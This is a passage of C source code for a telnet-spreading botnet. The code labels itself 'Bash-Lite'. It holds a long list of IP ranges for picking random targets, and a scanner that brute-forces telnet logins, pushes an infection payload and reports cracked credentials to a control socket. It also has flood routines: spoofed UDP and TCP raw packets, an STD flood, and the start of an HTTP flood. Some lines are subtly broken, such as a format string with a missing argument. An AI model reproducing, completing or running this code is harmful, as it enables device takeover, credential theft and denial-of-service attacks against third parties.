szprintf(ip, "103.220.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 132)
{
szprintf(ip, "183.233.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 133)
{
szprintf(ip, "103.242.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 134)
{
szprintf(ip, "103.198.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 135)
{
szprintf(ip, "103.14.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 136)
{
szprintf(ip, "103.195.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 137)
{
szprintf(ip, "103.203.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 138)
{
szprintf(ip, "103.214.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 139)
{
szprintf(ip, "103.218.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 140)
{
szprintf(ip, "103.218.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 141)
{
szprintf(ip, "103.225.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 142)
{
szprintf(ip, "103.228.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 143)
{
szprintf(ip, "103.231.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 144)
{
szprintf(ip, "103.60.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 145)
{
szprintf(ip, "103.248.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 146)
{
szprintf(ip, "103.253.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 147)
{
szprintf(ip, "103.255.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 148)
{
szprintf(ip, "103.35.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 149)
{
szprintf(ip, "103.49.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 150)
{
szprintf(ip, "103.62.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 151)
{
szprintf(ip, "144.48.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 152)
{
szprintf(ip, "49.149.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 153)
{
szprintf(ip, "58.69.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 154)
{
szprintf(ip, "223.29.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 155)
{
szprintf(ip, "59.153.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 156)
{
szprintf(ip, "113.176.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 157)
{
szprintf(ip, "113.175.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 158)
{
szprintf(ip, "113.177.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 159)
{
szprintf(ip, "113.183.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 160)
{
szprintf(ip, "202.164.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 161)
{
szprintf(ip, "203.134.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 162)
{
szprintf(ip, "210.56.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 163)
{
szprintf(ip, "49.156.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 164)
{
szprintf(ip, "203.210.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 165)
{
szprintf(ip, "117.181.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 166)
{
szprintf(ip, "117.178.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 167)
{
szprintf(ip, "117.177.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 168)
{
szprintf(ip, "117.176.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 169)
{
szprintf(ip, "117.170.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 170)
{
szprintf(ip, "117.171.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 171)
{
szprintf(ip, "117.162.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 172)
{
szprintf(ip, "112.26.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 173)
{
szprintf(ip, "112.27.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 174)
{
szprintf(ip, "112.28.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 175)
{
szprintf(ip, "112.29.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 176)
{
szprintf(ip, "112.30.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 177)
{
szprintf(ip, "112.31.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 178)
{
szprintf(ip, "203.150.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 179)
{
szprintf(ip, "76.9.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 180)
{
szprintf(ip, "103.82.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 181)
{
szprintf(ip, "27.124.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 182)
{
szprintf(ip, "112.200.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 183)
{
szprintf(ip, "112.201.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 184)
{
szprintf(ip, "112.202.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 185)
{
szprintf(ip, "112.203.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 186)
{
szprintf(ip, "112.204.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 187)
{
szprintf(ip, "112.205.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 188)
{
szprintf(ip, "112.206.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 189)
{
szprintf(ip, "112.207.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 190)
{
szprintf(ip, "112.208.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 191)
{
szprintf(ip, "112.209.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 192)
{
szprintf(ip, "112.210.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 193)
{
szprintf(ip, "112.%d.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 194)
{
szprintf(ip, "114.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 195)
{
szprintf(ip, "115.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 196)
{
szprintf(ip, "117.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 197)
{
szprintf(ip, "1.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 198)
{
szprintf(ip, "111.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 199)
{
szprintf(ip, "116.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 200)
{
szprintf(ip, "78.189.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 201)
{
szprintf(ip, "78.180.%d.%d", ipState[3], ipState[4]);
}
if(randnum == 202)
{
szprintf(ip, "78.181.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 203)
{
szprintf(ip, "78.182.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 204)
{
szprintf(ip, "78.183.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 205)
{
szprintf(ip, "78.184.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 206)
{
szprintf(ip, "78.185.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 207)
{
szprintf(ip, "95.6.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 208)
{
szprintf(ip, "78.162.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 209)
{
szprintf(ip, "78.160.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 210)
{
szprintf(ip, "85.101.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 211)
{
szprintf(ip, "88.224.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 212)
{
szprintf(ip, "88.226.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 213)
{
szprintf(ip, "88.228.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 214)
{
szprintf(ip, "212.156.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 215)
{
szprintf(ip, "88.233.%d.%d",  ipState[3], ipState[4]);
}
if(randnum == 216)
{
szprintf(ip, "169.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 217)
{
szprintf(ip, "78.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 218)
{
szprintf(ip, "76.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 219)
{
szprintf(ip, "88.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 220)
{
szprintf(ip, "95.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 221)
{
szprintf(ip, "132.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 222)
{
szprintf(ip, "190.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 223)
{
szprintf(ip, "119.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 224)
{//hehehhehehehehehe 69 :)
szprintf(ip, "69.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 225)
{
szprintf(ip, "70.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 226)
{
szprintf(ip, "183.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 227)
{
szprintf(ip, "176.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 228)
{
szprintf(ip, "83.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 229)
{
szprintf(ip, "220.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 230)
{
szprintf(ip, "113.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 231)
{
szprintf(ip, "112.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 232)
{
szprintf(ip, "110.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 233)
{
szprintf(ip, "109.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 234)
{
szprintf(ip, "107.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 235)
{
szprintf(ip, "106.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 236)
{
szprintf(ip, "105.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 237)
{
szprintf(ip, "104.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 238)
{
szprintf(ip, "103.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 239)
{
szprintf(ip, "102.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 240)
{
szprintf(ip, "101.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}
if(randnum == 241)
{
szprintf(ip, "100.%d.%d.%d", ipState[2], ipState[3], ipState[4]);
}

return inet_addr(ip);
}

int rangechoice = 1;
in_addr_t findARandomIP()
{
if(rangechoice < 1 || rangechoice > 2){
return HackerScan2();
}else{
if(rangechoice == 1){
return HackerScan2();
}else if(rangechoice == 2){
return get_random_ip();
}else{
return HackerScan2();
}
}
}

in_addr_t getRandomIP(in_addr_t netmask)
{
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
        memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
        memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
        unsigned short output = csum(tcp,totaltcp_len);
        free(tcp);
        return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + packetSize;
        iph->id = rand_cmwc();
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = protocol;
        iph->check = 0;
        iph->saddr = source;
        iph->daddr = dest;
}

int sclose(int fd)
{
        if(3 > fd) return 1;
        close(fd);
        return 0;
}

				
struct telstate_t
{
int fd;
unsigned int ip;
unsigned char state;
unsigned char complete;
unsigned char usernameInd;
unsigned char passwordInd;
unsigned char tempDirInd;
unsigned int totalTimeout;
unsigned short bufUsed;
char *sockbuf;
};
const char* get_telstate_host(struct telstate_t* telstate)
{
struct in_addr in_addr_ip;
in_addr_ip.s_addr = telstate->ip;
return inet_ntoa(in_addr_ip);
}
int read_until_response(int fd, int timeout_usec, char* buffer, int buf_size, char **strings)
{
int num_bytes, i;
memset(buffer, 0, buf_size);
num_bytes = read_with_timeout(fd, timeout_usec, buffer, buf_size);
if(buffer[0] == 0xFF)
{
negotiate(fd, buffer, 3);
}
if(contains_string(buffer, strings))
{
return 1;
}
return 0;
}
int read_with_timeout(int fd, int timeout_usec, char* buffer, int buf_size)
{
fd_set read_set;
struct timeval tv;
tv.tv_sec = 0;
tv.tv_usec = timeout_usec;
FD_ZERO(&read_set);
FD_SET(fd, &read_set);
if (select(fd+1, &read_set, NULL, NULL, &tv) < 1)
return 0;
return recv(fd, buffer, buf_size, 0);
}
int contains_fail(char* buffer)
{
return contains_string(buffer, fails);
}
int contains_string(char* buffer, char** strings)
{
int num_strings = 0, i = 0;
for(num_strings = 0; strings[++num_strings] != 0; );
for(i = 0; i < num_strings; i++)
{
if(strcasestr(buffer, strings[i]))
{
return 1;
}
}
return 0;
}
int contains_success(char* buffer)
{
return contains_string(buffer, successes);
}
char* infected[] = {"BUILD"};
char* infected2[] = {"BUILD"};

void StartTheLelz() {
int i, res, j, wait_usec = 100, max = 1024;
char buf[128], cur_dir;
fd_set fdset;
struct timeval tv;
socklen_t lon;
int valopt;
srand(time(NULL) ^ rand_cmwc());
char line[256];
char* buffer;
struct sockaddr_in dest_addr;
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
buffer = malloc(1024 + 1);
memset(buffer, 0, 1024 + 1);
struct telstate_t fds[max];
memset(fds, 0, max * (sizeof(int) + 1));
for(i = 0; i < max; i++) {
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].complete = 1;
fds[i].sockbuf = buffer; }
while(1) {
for(i = 0; i < max; i++) {
if(fds[i].totalTimeout == 0) {
fds[i].totalTimeout = time(NULL); }
switch(fds[i].state) {
case 0: {
if(fds[i].complete == 1) {
char *tmp = fds[i].sockbuf;
memset(&(fds[i]), 0, sizeof(struct telstate_t));
fds[i].sockbuf = tmp;
fds[i].ip = findARandomIP(); }
else if(fds[i].complete == 0) {
fds[i].passwordInd++;
fds[i].usernameInd++;
if(fds[i].passwordInd == sizeof(passwords) / sizeof(char *)) {
fds[i].complete = 1;
continue; }
if(fds[i].usernameInd == sizeof(usernames) / sizeof(char *)) {
fds[i].complete = 1;
continue;
}
}
dest_addr.sin_family = AF_INET;
dest_addr.sin_port = htons(23);
memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
dest_addr.sin_addr.s_addr = fds[i].ip;
fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
if(fds[i].fd == -1) continue;
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
if(connect(fds[i].fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
sclose(fds[i].fd);
fds[i].complete = 1; }
else {
fds[i].state = 1;
fds[i].totalTimeout = 0;
}
}
break;
case 1:
{
FD_ZERO(&fdset);
FD_SET(fds[i].fd, &fdset);
tv.tv_sec = 0;
tv.tv_usec = wait_usec;
res = select(fds[i].fd+1, NULL, &fdset, NULL, &tv);
if(res == 1) {
lon = sizeof(int);
valopt = 0;
getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
if(valopt) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
} else {
fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
fds[i].totalTimeout = 0;
fds[i].bufUsed = 0;
memset(fds[i].sockbuf, 0, 1024);
fds[i].state = 2;
} continue; }
else if(res == -1) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(fds[i].totalTimeout + 6 < time(NULL)) {
sclose(fds[i].fd);
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 2:
{
if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, 512, advances)) {
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 3; }
continue; }
if(fds[i].totalTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 3: {
if(send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 4; }
break;
case 4:
{
if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, 1024, advances))
{
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0;
} else {
fds[i].state = 5; }
continue; }
if(fds[i].totalTimeout + 6 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 5:
{
if(send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
if(send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
fds[i].state = 0;
fds[i].complete = 1;
continue; }
fds[i].state = 6;
}
break;
case 6:
{
if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, 1024, advances2)) {
fds[i].totalTimeout = time(NULL);
if(contains_fail(fds[i].sockbuf)) {
fds[i].state = 0; }
else if(contains_success(fds[i].sockbuf)) {
if(fds[i].complete == 2) {
fds[i].state = 7; }
else {
sockprintf(mainCommSock, "\x1b[31m[Bash-Lite] \x1b[32mConnected [%s] [%s:%s]\x1b[0m", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
fds[i].state = 7; }
} else {
fds[i].state = 0;
fds[i].complete = 1;
} continue; }
if(fds[i].totalTimeout + 7 < time(NULL)) {
fds[i].state = 0;
fds[i].complete = 1;
}
}
break;
case 7:
{
         if(send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) {
         fds[i].state = 0;
         fds[i].complete = 1;
         continue; }
         if(send(fds[i].fd, "enable\r\n", 8, MSG_NOSIGNAL) < 0) {
         fds[i].state = 0;
         fds[i].complete = 1;
         continue; }
         fds[i].state = 8;
}
break;
case 8: { 

            fds[i].totalTimeout = time(NULL);
            if(send(fds[i].fd, infect, strlen(infect), MSG_NOSIGNAL) < 0) {
            sclose(fds[i].fd);
            fds[i].state = 0;
            fds[i].complete = 1;
            continue; }
      	    if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, 512, infected))
				{
		    if(strcasestr(fds[i].sockbuf, infected2) && fds[i].complete != 3)
				{
			     printf("\x1b[31m[Bash-Lite] \x1b[32mSuccess\x1b[0m\r\n");
			sockprintf(mainCommSock, "\x1b[32mINFECTION SUCCESS -> %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
			fds[i].complete = 3;
			}
		 }
       if(fds[i].totalTimeout + 60 < time(NULL)) {
       if(fds[i].complete !=3){
       }
    fds[i].state = 0;
    fds[i].complete = 1;
     }
     break;
    }
   }
  }
 }
}

void sendUDP(unsigned char *target, int port, int timeEnd, int packetsize)
{
        struct sockaddr_in dest_addr;
        int pollinterval = 10;
	    int spoofit = 32;
        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        register unsigned int pollRegister;
        pollRegister = pollinterval;

        if(spoofit == 32)
        {
                int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                if(!sockfd)
                {
                        return;
                }

                unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
                if(buf == NULL) return;
                memset(buf, 0, packetsize + 1);
                makeRandomStr(buf, packetsize);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1)
                {
                        sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        if(i == pollRegister)
                        {
                                if(port == 0) dest_addr.sin_port = rand_cmwc();
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        } else {
                int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
                if(!sockfd)
                {
                        return;
                }

                int tmp = 1;
                if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
                {
                        return;
                }

                int counter = 50;
                while(counter--)
                {
                        srand(time(NULL) ^ rand_cmwc());
                        init_rand(rand());
                }

                in_addr_t netmask;

                netmask = ( ~((1 << (32 - spoofit)) - 1) );

                unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
                struct iphdr *iph = (struct iphdr *)packet;
                struct udphdr *udph = (void *)iph + sizeof(struct iphdr);

                makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

                udph->len = htons(sizeof(struct udphdr) + packetsize);
                udph->source = rand_cmwc();
                udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                udph->check = 0;

                makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize);

                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                int end = time(NULL) + timeEnd;
                register unsigned int i = 0;
                while(1)
                {
                        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                        udph->source = rand_cmwc();
                        udph->dest = (port == 0 ? rand_cmwc() : htons(port));
                        iph->id = rand_cmwc();
                        iph->saddr = htonl( getRandomIP(netmask) );
                        iph->check = csum ((unsigned short *) packet, iph->tot_len);

                        if(i == pollRegister)
                        {
                                if(time(NULL) > end) break;
                                i = 0;
                                continue;
                        }
                        i++;
                }
        }
}
void sendTCP(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
        register unsigned int pollRegister;
        pollRegister = pollinterval;

        struct sockaddr_in dest_addr;

        dest_addr.sin_family = AF_INET;
        if(port == 0) dest_addr.sin_port = rand_cmwc();
        else dest_addr.sin_port = htons(port);
        if(getHost(target, &dest_addr.sin_addr)) return;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        if(!sockfd)
        {
                return;
        }

        int tmp = 1;
        if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)
        {
                return;
        }

        in_addr_t netmask;

        if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
        else netmask = ( ~((1 << (32 - spoofit)) - 1) );

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
        struct iphdr *iph = (struct iphdr *)packet;
        struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

        tcph->source = rand_cmwc();
        tcph->seq = rand_cmwc();
        tcph->ack_seq = 0;
        tcph->doff = 5;

        if(!strcmp(flags, "all"))
        {
                tcph->syn = 1;
                tcph->rst = 1;
                tcph->fin = 1;
                tcph->ack = 1;
                tcph->psh = 1;
        } else {
                unsigned char *pch = strtok(flags, ",");
                while(pch)
                {
                        if(!strcmp(pch,         "syn"))
                        {
                                tcph->syn = 1;
                        } else if(!strcmp(pch,  "rst"))
                        {
                                tcph->rst = 1;
                        } else if(!strcmp(pch,  "fin"))
                        {
                                tcph->fin = 1;
                        } else if(!strcmp(pch,  "ack"))
                        {
                                tcph->ack = 1;
                        } else if(!strcmp(pch,  "psh"))
                        {
                                tcph->psh = 1;
                        } else {
                        }
                        pch = strtok(NULL, ",");
                }
        }

        tcph->window = rand_cmwc();
        tcph->check = 0;
        tcph->urg_ptr = 0;
        tcph->dest = (port == 0 ? rand_cmwc() : htons(port));
        tcph->check = tcpcsum(iph, tcph);

        iph->check = csum ((unsigned short *) packet, iph->tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        while(1)
        {
                sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

                iph->saddr = htonl( getRandomIP(netmask) );
                iph->id = rand_cmwc();
                tcph->seq = rand_cmwc();
                tcph->source = rand_cmwc();
                tcph->check = 0;
                tcph->check = tcpcsum(iph, tcph);
                iph->check = csum ((unsigned short *) packet, iph->tot_len);

                if(i == pollRegister)
                {
                        if(time(NULL) > end) break;
                        i = 0;
                        continue;
                }
                i++;
        }
}
//!* STD IP PORT TIME SIZE
void sendSTD(unsigned char *ip, int port, int secs, int psize) {

    int iSTD_Sock;

    iSTD_Sock = socket(AF_INET, SOCK_DGRAM, 0);

    time_t start = time(NULL);

    struct sockaddr_in sin;

    struct hostent *hp;

    hp = gethostbyname(ip);

    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = port;

    unsigned int a = 0;

    while(1){
        if (a >= 50) 
        {
			srand(time(NULL));
			char *haxed;
			haxed = randomString(22);
            send(iSTD_Sock, haxed, psize, 0);
            connect(iSTD_Sock,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + secs) 
            {
                close(iSTD_Sock);
				free(haxed);
				_exit(0);
            }
            a = 0;
        }
        a++;
    }
	

}

int socket_connect(char *host, in_port_t port) {
struct hostent *hp;
struct sockaddr_in addr;
int on = 1, sock;     
if ((hp = gethostbyname(host)) == NULL) return 0;
bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
addr.sin_port = htons(port);
addr.sin_family = AF_INET;
sock = socket(PF_INET, SOCK_STREAM, 0);
setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));
if (sock == -1) return 0;
if (connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) return 0;
return sock;
}
void sendHTTP(void *host, char *method, in_port_t port, char *path, int timeFoo, int power) {
const char *useragents[] = {
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Opera/6.04 (Windows XP; U) [en]",
"Opera/9.99 (X11; U; sk)",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",
"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)"
};
const char *connections[] = {"close", "keep-alive", "accept"};
int i, timeEnd = time(NULL) + timeFoo;
char request[1024], request2[1024], buffer[1];
sprintf(request, "%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n", method, path, connections[(rand() % 3)], useragents[(rand() % 14)]);
